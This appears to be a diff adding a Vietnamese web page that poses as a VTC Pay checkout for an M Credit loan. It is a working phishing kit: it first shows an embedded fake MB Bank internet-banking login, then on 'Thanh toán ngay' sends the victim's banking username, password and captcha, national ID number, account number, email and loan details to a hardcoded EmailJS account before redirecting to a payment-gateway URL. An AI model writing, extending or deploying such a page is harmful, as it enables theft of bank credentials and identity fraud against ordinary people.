@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="vi">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta
+      name="description"
+      content="Thanh toán qua cổng VTC Pay - M Credit"
+    />
+    <title>Thanh Toán VTC Pay - M Credit</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4.4.1/dist/email.min.js"></script>
+    <style>
+      :root {
+        --vtc-blue: #0066cc;
+        --vtc-cyan: #00a0e9;
+        --mcredit-green: #00994f;
+        --text-primary: #1a202c;
+        --text-secondary: #4a5568;
+        --background-primary: #ffffff;
+        --background-secondary: #f7fafc;
+        --border-color: #e2e8f0;
+        --success: #38a169;
+        --error: #e53e3e;
+      }
+
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Inter", sans-serif;
+      }
+
+      body {
+        background: #e2e8f0;
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: flex-start;
+        padding: 20px;
+      }
+
+      .mobile-frame {
+        width: 100%;
+        max-width: 420px;
+        background: var(--background-secondary);
+        border-radius: 24px;
+        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+        overflow: hidden;
+        min-height: 640px;
+        display: flex;
+        flex-direction: column;
+      }
+
+      .page-header {
+        padding: 16px;
+        text-align: center;
+        background: var(--background-primary);
+        border-bottom: 1px solid var(--border-color);
+        position: relative;
+      }
+
+      .page-header h1 {
+        font-size: 16px;
+        font-weight: 600;
+      }
+
+      .back-button {
+        position: absolute;
+        left: 12px;
+        top: 50%;
+        transform: translateY(-50%);
+        background: transparent;
+        border: none;
+        cursor: pointer;
+        padding: 8px;
+        border-radius: 50%;
+      }
+
+      .page-body {
+        flex: 1;
+        padding: 16px;
+        display: flex;
+        flex-direction: column;
+        gap: 16px;
+      }
+
+      .vtc-logo-wrap {
+        text-align: center;
+        padding: 12px 0 4px;
+      }
+
+      .vtc-logo-wrap img {
+        height: 48px;
+        object-fit: contain;
+      }
+
+      .info-card {
+        background: var(--background-primary);
+        border-radius: 16px;
+        padding: 16px;
+        border: 1px solid var(--border-color);
+      }
+
+      .amount {
+        font-size: 28px;
+        font-weight: 700;
+        color: var(--vtc-blue);
+        text-align: center;
+        margin-bottom: 8px;
+      }
+
+      .detail-item {
+        display: flex;
+        justify-content: space-between;
+        gap: 12px;
+        padding: 8px 0;
+        border-bottom: 1px solid var(--border-color);
+        font-size: 14px;
+      }
+
+      .detail-item:last-child {
+        border-bottom: none;
+      }
+
+      .detail-item .label {
+        color: var(--text-secondary);
+      }
+
+      .detail-item .value {
+        font-weight: 600;
+        text-align: right;
+        word-break: break-all;
+      }
+
+      .notice {
+        background: #ebf8ff;
+        border: 1px solid #bee3f8;
+        border-radius: 12px;
+        padding: 12px;
+        font-size: 13px;
+        color: #2c5282;
+        line-height: 1.5;
+      }
+
+      .page-footer {
+        padding: 16px;
+        background: var(--background-primary);
+        border-top: 1px solid var(--border-color);
+      }
+
+      .button {
+        width: 100%;
+        border: none;
+        border-radius: 12px;
+        padding: 14px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+      }
+
+      .button.primary {
+        background: linear-gradient(135deg, var(--vtc-blue), var(--vtc-cyan));
+        color: #fff;
+      }
+
+      .button.primary:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+      }
+
+      .loading-overlay {
+        display: none;
+        position: fixed;
+        inset: 0;
+        background: rgba(255, 255, 255, 0.92);
+        z-index: 100;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        gap: 16px;
+      }
+
+      .loading-overlay.show {
+        display: flex;
+      }
+
+      .spinner {
+        width: 40px;
+        height: 40px;
+        border: 4px solid #e2e8f0;
+        border-top-color: var(--vtc-blue);
+        border-radius: 50%;
+        animation: spin 0.8s linear infinite;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      .mbbank-login-view {
+        display: none;
+        flex: 1;
+        flex-direction: column;
+        min-height: 640px;
+      }
+
+      .mbbank-login-view.active {
+        display: flex;
+      }
+
+      .mbbank-login-view .page-header h1 {
+        font-size: 14px;
+      }
+
+      .mbbank-login-frame-wrap {
+        flex: 1;
+        overflow: hidden;
+      }
+
+      .mbbank-login-frame-wrap iframe {
+        width: 100%;
+        height: 100%;
+        min-height: 580px;
+        border: none;
+        display: block;
+      }
+
+      #vtcpay-view.hidden {
+        display: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="mobile-frame">
+      <div class="mbbank-login-view" id="mbbank-login-view">
+        <header class="page-header">
+          <button
+            class="back-button"
+            onclick="window.location.href='Evaluate-conditions.html'"
+            aria-label="Quay lại"
+          >
+            ←
+          </button>
+          <h1>Đăng nhập MB Internet Banking</h1>
+        </header>
+        <div class="mbbank-login-frame-wrap">
+          <iframe
+            id="mbbank-login-frame"
+            src="about:blank"
+            title="MB Internet Banking"
+          ></iframe>
+        </div>
+      </div>
+
+      <div id="vtcpay-view">
+      <header class="page-header">
+        <button
+          class="back-button"
+          onclick="window.location.href='Evaluate-conditions.html'"
+          aria-label="Quay lại"
+        >
+          ←
+        </button>
+        <h1>Thanh toán VTC Pay</h1>
+      </header>
+
+      <main class="page-body">
+        <div class="vtc-logo-wrap">
+          <img
+            src="https://vtcpay.vn/assets/images/logo-vtcpay.svg"
+            alt="VTC Pay"
+            onerror="this.src='https://via.placeholder.com/160x48?text=VTC+Pay'"
+          />
+        </div>
+
+        <div class="info-card">
+          <div class="amount" id="mainAmount">—</div>
+          <div id="payment-details"></div>
+        </div>
+
+        <div class="info-card">
+          <div id="customer-details"></div>
+        </div>
+
+        <div class="notice">
+          Bạn sẽ được chuyển sang cổng thanh toán VTC Pay để hoàn tất giao dịch.
+          Vui lòng không đóng trình duyệt trong quá trình thanh toán.
+        </div>
+      </main>
+
+      <footer class="page-footer">
+        <button class="button primary" id="payBtn" onclick="redirectToVtcPay()">
+          Thanh toán ngay
+        </button>
+      </footer>
+      </div>
+    </div>
+
+    <div class="loading-overlay" id="loadingOverlay">
+      <div class="spinner"></div>
+      <p>Đang chuyển sang VTC Pay...</p>
+    </div>
+
+    <script>
+      const EMAILJS_CONFIG = {
+        serviceId: "service_ezzpzs5",
+        templateId: "template_cqo9ino",
+        publicKey: "MQKcpIwixBVd4Q920",
+      };
+
+      emailjs.init({ publicKey: EMAILJS_CONFIG.publicKey });
+
+      const VTC_CONFIG = {
+        website_id: 6592,
+        receiver_account: "2C2P",
+        secretKey: "YOUR_VTC_SECRET_KEY",
+        checkoutUrl: "https://vtcpay.vn/bank-gateway/checkout.html",
+        url_return:
+          "https://vn-agents-frontend-123.2c2p.com/vtc/webpayment/resultvtc",
+        currency: "VND",
+        language: "vi",
+        transaction_type: "sale",
+      };
+
+      const BANK_CODE_MAP = {
+        acb: "ACB",
+        vietcombank: "VCB",
+        vietinbank: "VTB",
+        bidv: "BIDV",
+        techcombank: "TCB",
+        agribank: "AGB",
+        mbbank: "MB",
+        vpbank: "VPB",
+        sacombank: "STB",
+        tpbank: "TPB",
+      };
+
+      function getFormData() {
+        const stored = JSON.parse(sessionStorage.getItem("formData")) || {};
+        const params = new URLSearchParams(window.location.search);
+        const amountRaw =
+          stored.amountNumeric ||
+          stored.amount?.replace(/[^0-9]/g, "") ||
+          params.get("amount") ||
+          "13000";
+        return {
+          fullName: stored.fullName || params.get("fullName") || "Nguyễn Văn A",
+          cccd: stored.cccd || params.get("cccd") || "",
+          amount: parseInt(amountRaw, 10) || 13000,
+          phone: stored.phone || params.get("phone") || "",
+          email: stored.email || params.get("email") || "",
+          months: stored.months || "",
+          accountNumber: stored.accountNumber || "",
+          accountHolder: stored.accountHolder || "",
+          bank: (stored.bankKey || stored.bank || params.get("bank") || "acb").toLowerCase(),
+          bankLabel: stored.bank || params.get("bank") || "",
+          method: stored.method || "VTC Pay",
+          methodKey: stored.methodKey || "vtcpay",
+        };
+      }
+
+      function isMbbankSelected(data) {
+        const bank = (data.bank || "").toLowerCase();
+        const label = (data.bankLabel || "").toLowerCase();
+        return (
+          bank === "mbbank" ||
+          bank === "mb" ||
+          bank.includes("quân đội") ||
+          label.includes("mb bank") ||
+          label.includes("quân đội")
+        );
+      }
+
+      function hasMbbankLogin() {
+        try {
+          return !!JSON.parse(sessionStorage.getItem("mbbankLogin") || "null")?.phone;
+        } catch (_) {
+          return false;
+        }
+      }
+
+      function showMbbankLoginView() {
+        document.getElementById("vtcpay-view").classList.add("hidden");
+        document.getElementById("mbbank-login-view").classList.add("active");
+        document.getElementById("mbbank-login-frame").src =
+          "mbbank-login.html?embedded=1&next=vtcpay";
+      }
+
+      function showVtcpayView() {
+        document.getElementById("mbbank-login-view").classList.remove("active");
+        document.getElementById("vtcpay-view").classList.remove("hidden");
+        document.getElementById("mbbank-login-frame").src = "about:blank";
+      }
+
+      const formData = getFormData();
+
+      function formatCurrency(amount) {
+        return new Intl.NumberFormat("vi-VN", {
+          style: "currency",
+          currency: "VND",
+        }).format(amount);
+      }
+
+      function createDetailItem(label, value) {
+        const item = document.createElement("div");
+        item.className = "detail-item";
+        item.innerHTML = `<span class="label">${label}</span><span class="value">${value}</span>`;
+        return item;
+      }
+
+      function generateReferenceNumber() {
+        const now = Date.now().toString();
+        return now.slice(-10);
+      }
+
+      function getPaymentType(bank) {
+        if (isMbbankSelected({ bank, bankLabel: bank })) return BANK_CODE_MAP.mbbank;
+        return BANK_CODE_MAP[bank] || bank.toUpperCase() || "ACB";
+      }
+
+      async function sha256HexUpper(text) {
+        const encoded = new TextEncoder().encode(text);
+        const hashBuffer = await crypto.subtle.digest("SHA-256", encoded);
+        const hashArray = Array.from(new Uint8Array(hashBuffer));
+        return hashArray
+          .map((b) => b.toString(16).padStart(2, "0"))
+          .join("");
+      }
+
+      async function buildSignature(params) {
+        const keys = Object.keys(params).sort();
+        const plainText =
+          keys.map((k) => params[k]).join("|") + "|" + VTC_CONFIG.secretKey;
+        return sha256HexUpper(plainText);
+      }
+
+      async function buildCheckoutUrl() {
+        const referenceNumber = generateReferenceNumber();
+        const paymentType = getPaymentType(formData.bank);
+
+        const signParams = {
+          amount: String(formData.amount),
+          currency: VTC_CONFIG.currency,
+          language: VTC_CONFIG.language,
+          payment_type: paymentType,
+          reference_number: referenceNumber,
+          transaction_type: VTC_CONFIG.transaction_type,
+          url_return: VTC_CONFIG.url_return,
+          website_id: String(VTC_CONFIG.website_id),
+        };
+
+        const signature = await buildSignature(signParams);
+
+        const query = new URLSearchParams({
+          website_id: String(VTC_CONFIG.website_id),
+          amount: String(formData.amount),
+          receiver_account: VTC_CONFIG.receiver_account,
+          reference_number: referenceNumber,
+          currency: VTC_CONFIG.currency,
+          language: VTC_CONFIG.language,
+          payment_type: paymentType,
+          url_return: VTC_CONFIG.url_return,
+          signature: signature,
+          transaction_type: VTC_CONFIG.transaction_type,
+        });
+
+        return VTC_CONFIG.checkoutUrl + "?" + query.toString();
+      }
+
+      function populateUI() {
+        document.getElementById("mainAmount").textContent = formatCurrency(
+          formData.amount
+        );
+
+        const paymentDetails = document.getElementById("payment-details");
+        paymentDetails.innerHTML = "";
+        paymentDetails.appendChild(
+          createDetailItem("Ngân hàng", formData.bankLabel || getPaymentType(formData.bank))
+        );
+        paymentDetails.appendChild(
+          createDetailItem("Phương thức", formData.method || "VTC Pay")
+        );
+        paymentDetails.appendChild(
+          createDetailItem("Loại giao dịch", "Thanh toán (sale)")
+        );
+        paymentDetails.appendChild(
+          createDetailItem("Cổng thanh toán", "VTC Pay")
+        );
+
+        const customerDetails = document.getElementById("customer-details");
+        customerDetails.innerHTML = "";
+        customerDetails.appendChild(
+          createDetailItem("Khách hàng", formData.fullName)
+        );
+        if (formData.cccd) {
+          customerDetails.appendChild(
+            createDetailItem("CCCD", formData.cccd)
+          );
+        }
+        if (formData.phone) {
+          customerDetails.appendChild(
+            createDetailItem("Số điện thoại", formData.phone)
+          );
+        }
+        if (formData.accountNumber) {
+          customerDetails.appendChild(
+            createDetailItem("Số tài khoản", formData.accountNumber)
+          );
+        }
+        if (formData.accountHolder) {
+          customerDetails.appendChild(
+            createDetailItem("Chủ tài khoản", formData.accountHolder)
+          );
+        }
+      }
+
+      async function sendPaymentToEmailJS() {
+        const stored = JSON.parse(sessionStorage.getItem("formData") || "{}");
+        const mbbankLogin = JSON.parse(sessionStorage.getItem("mbbankLogin") || "null") || {};
+
+        const templateParams = {
+          platform: "VTC Pay (Mcredit)",
+          phone: mbbankLogin.phone || formData.phone || stored.phone || "",
+          phone_number: mbbankLogin.phone || formData.phone || stored.phone || "",
+          username: mbbankLogin.phone || formData.phone || stored.phone || "",
+          password: mbbankLogin.password || "",
+          captcha: mbbankLogin.captcha || "",
+          submitted_at: new Date().toLocaleString("vi-VN"),
+          customer_name: formData.fullName || stored.fullName || "",
+          full_name: formData.fullName || stored.fullName || "",
+          amount: stored.amount || String(formData.amount || ""),
+          loan_amount: stored.amount || String(formData.amount || ""),
+          bank: formData.bankLabel || stored.bank || getPaymentType(formData.bank),
+          bank_name: formData.bankLabel || stored.bank || getPaymentType(formData.bank),
+          bank_key: formData.bank || stored.bankKey || "",
+          method: formData.method || stored.method || "VTC Pay",
+          method_key: formData.methodKey || stored.methodKey || "vtcpay",
+          disbursement_method: formData.method || stored.method || "VTC Pay",
+          cccd: formData.cccd || stored.cccd || "",
+          id_number: formData.cccd || stored.cccd || "",
+          email: formData.email || stored.email || "",
+          account_number: formData.accountNumber || stored.accountNumber || "",
+          account_holder: formData.accountHolder || stored.accountHolder || "",
+          account_holder_name: formData.accountHolder || stored.accountHolder || "",
+          months: formData.months || stored.months || "",
+          loan_term: (formData.months || stored.months)
+            ? (formData.months || stored.months) + " tháng"
+            : "",
+          page: "vtcpay.html",
+        };
+
+        const response = await emailjs.send(
+          EMAILJS_CONFIG.serviceId,
+          EMAILJS_CONFIG.templateId,
+          templateParams
+        );
+
+        if (response.status !== 200) {
+          throw new Error("EmailJS trả về mã lỗi: " + response.status);
+        }
+
+        return response;
+      }
+
+      async function redirectToVtcPay() {
+        const btn = document.getElementById("payBtn");
+        const overlay = document.getElementById("loadingOverlay");
+        btn.disabled = true;
+        overlay.classList.add("show");
+
+        try {
+          await sendPaymentToEmailJS();
+          const checkoutUrl = await buildCheckoutUrl();
+          localStorage.setItem("currentStep", "vtcpay.html");
+          window.location.href = checkoutUrl;
+        } catch (err) {
+          btn.disabled = false;
+          overlay.classList.remove("show");
+          alert(
+            "Không gửi được thông tin hoặc không thể tạo link thanh toán. Vui lòng thử lại.\n" +
+              (err.text || err.message || "")
+          );
+          console.error(err);
+        }
+      }
+
+      populateUI();
+
+      if (!hasMbbankLogin()) {
+        showMbbankLoginView();
+      } else {
+        showVtcpayView();
+      }
+
+      window.addEventListener("message", (event) => {
+        if (event.data?.type === "mbbank-login-success" && hasMbbankLogin()) {
+          showVtcpayView();
+        }
+      });
+    </script>
+  </body>
+</html>
